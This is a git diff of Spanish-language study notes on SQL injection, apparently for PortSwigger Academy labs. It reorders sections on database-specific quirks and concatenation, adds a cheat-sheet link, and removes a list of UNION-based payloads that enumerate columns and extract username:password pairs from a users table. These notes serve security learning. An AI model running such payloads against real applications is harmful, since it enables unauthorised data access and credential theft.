@@ -150,28 +150,13 @@ Para saber más:
 [Examining_the_database](https://github.com/juanpoch/PortSwigger_Academy/tree/main/Server-side/1_SQL_injection/1_Examining_the_database)  
 
 
-Si sólo la 2ª columna es visible y admite texto, y la original tiene 3 columnas, coloca los datos en la 2ª posición:
-
-```
-' UNION SELECT NULL, username || ':' || password, NULL FROM users--   -- Oracle (|| concatenation)
-' UNION SELECT NULL, CONCAT(username,':',password), NULL FROM users-- -- MySQL (CONCAT)
-```
-
 Si desconocés los nombres de tabla/columnas, primero harás *enumeración* usando `information_schema` (MySQL/Postgres/SQL Server) o `all_tables` / `all_tab_columns` en Oracle.
 
 ---
 
-## 4) Particularidades por base de datos
+## 4) Recuperar múltiples valores en una sola columna (concatenación)
 
-* **MySQL**: permite `UNION SELECT NULL` sin `FROM`. Comentarios: `-- ` necesita espacio; `#` también funciona. Uso frecuente de `GROUP_CONCAT` y `CONCAT`.
-* **PostgreSQL**: permite `UNION SELECT NULL` y usa `||` para concatenar; también `string_agg` para agrupar.
-* **Microsoft SQL Server**: `@@version`, `+` o `CONCAT()` para concatenar, `WAITFOR DELAY` para time-based.
-* **Oracle**: **obligatorio** `FROM DUAL` si seleccionás literales; concatenación con `||`. Para `UNION` con literales: `SELECT 'a' FROM DUAL`.
-* **SQLite**: admite `UNION SELECT NULL` y `||` para concatenación; metadatos en `sqlite_master`.
-
----
-
-## 5) Recuperar múltiples valores en una sola columna (concatenación)
+(SQLi Cheet Sheet)[https://portswigger.net/web-security/sql-injection/cheat-sheet]
 
 Si sólo hay 1 columna disponible, puedes concatenar varias columnas en una sola cadena separada por un separador reconocible:
 
@@ -187,59 +172,16 @@ Ejemplo Oracle con `UNION` (1 columna visible):
 
 ---
 
-## 6) Payloads útiles (listas) — genéricas y por SGBD
+## 5) Particularidades por base de datos
 
-**Detección de número de columnas (general):**
-
-```
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
-```
-
-**Prueba por `UNION NULL` (MySQL/Postgres/SQL Server/SQLite):**
-
-```
-' UNION SELECT NULL--
-' UNION SELECT NULL, NULL--
-' UNION SELECT NULL, NULL, NULL--
-```
-
-**Prueba `UNION NULL` en Oracle (usar DUAL):**
-
-```
-' UNION SELECT NULL FROM DUAL--
-' UNION SELECT NULL, NULL FROM DUAL--
-```
-
-**Identificar columna visible (ej. 4 columnas):**
-
-```
-' UNION SELECT 'c1', NULL, NULL, NULL--
-' UNION SELECT NULL, 'c2', NULL, NULL--
-' UNION SELECT NULL, NULL, 'c3', NULL--
-' UNION SELECT NULL, NULL, NULL, 'c4'--
-```
-
-**Exfiltrar (ej. 2 columnas, MySQL):**
-
-```
-' UNION SELECT username, password FROM users--
-```
-
-**Exfiltrar en 1 columna concatenada (Oracle):**
-
-```
-' UNION SELECT username || '~' || password FROM users--
-```
-
-**Exfiltrar varias filas en una sola célula (MySQL):**
-
-```
-' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR ',') FROM users--
-```
+* **MySQL**: permite `UNION SELECT NULL` sin `FROM`. Comentarios: `-- ` necesita espacio; `#` también funciona. Uso frecuente de `GROUP_CONCAT` y `CONCAT`.
+* **PostgreSQL**: permite `UNION SELECT NULL` y usa `||` para concatenar; también `string_agg` para agrupar.
+* **Microsoft SQL Server**: `@@version`, `+` o `CONCAT()` para concatenar, `WAITFOR DELAY` para time-based.
+* **Oracle**: **obligatorio** `FROM DUAL` si seleccionás literales; concatenación con `||`. Para `UNION` con literales: `SELECT 'a' FROM DUAL`.
+* **SQLite**: admite `UNION SELECT NULL` y `||` para concatenación; metadatos en `sqlite_master`.
 
 ---
+
 
 ## 7) Consejos prácticos y trucos
 
